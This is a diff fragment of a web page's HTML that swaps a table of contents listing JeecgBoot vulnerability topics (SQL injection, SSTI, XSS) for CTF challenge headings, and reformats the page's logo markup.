 				&lt;div class=&quot;fa fa-thumbs-o-down&quot;&gt;&lt;/div&gt;
 				&lt;/span&gt;
@@ -853,15 +847,19 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/2010010
             &lt;code-index-css&gt;
                 &lt;ul&gt;&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column&quot;&gt;&lt;a&gt;文章目录&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
                 &lt;ul id=&quot;toc&quot; class=&quot;section-nav&quot;&gt;
-&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#ref&quot;&gt;REF&lt;/a&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#1misc01&quot;&gt;1、MISC01&lt;/a&gt;
 &lt;ul&gt;
-&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#jeecgboot-sql注入漏洞&quot;&gt;JeecgBoot sql注入漏洞&lt;/a&gt;&lt;/li&gt;
-&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#queryfieldbysql-注入内存马&quot;&gt;queryFieldBySql 注入内存马&lt;/a&gt;&lt;/li&gt;
-&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#jeecgboot-ssti-漏洞&quot;&gt;JeecgBoot SSTI 漏洞&lt;/a&gt;&lt;/li&gt;
-&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#漏洞分析&quot;&gt;漏洞分析&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#11赛题描述&quot;&gt;1.1、赛题描述&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#12解题思路&quot;&gt;1.2、解题思路&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#jeecgboot反射型xss漏洞&quot;&gt;JeecgBoot反射型XSS漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#2misc04&quot;&gt;2、MISC04&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#21赛题描述&quot;&gt;2.1、赛题描述&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#22解题思路&quot;&gt;2.2、解题思路&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#3&quot;&gt;3、…&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
             &lt;/code-index-css&gt;
         &lt;/li&gt;
@@ -938,15 +936,12 @@ vim: ts=2 sts=2 sw=2 noexpandtab
                 -->
                 <div>
                     <picture>
+  <source srcset="/assets/img/logo-small-dark.png 1x,/assets/img/logo-small-dark@2x.png 2x,/assets/img/logo-small-dark@3x.png 3x,/assets/img/logo-small-dark@4x.png 4x," media="(prefers-color-scheme: dark)" />
   
-  
-  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
-  
-  
-  
-  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  <img src="/assets/img/logo-small.logo-small" srcset="/assets/img/logo-small.png 1x,/assets/img/logo-small@2x.png 2x,/assets/img/logo-small@3x.png 3x,/assets/img/logo-small@4x.png 4x," />
   
 </picture>
+
                     
                 </div>
                 <div>
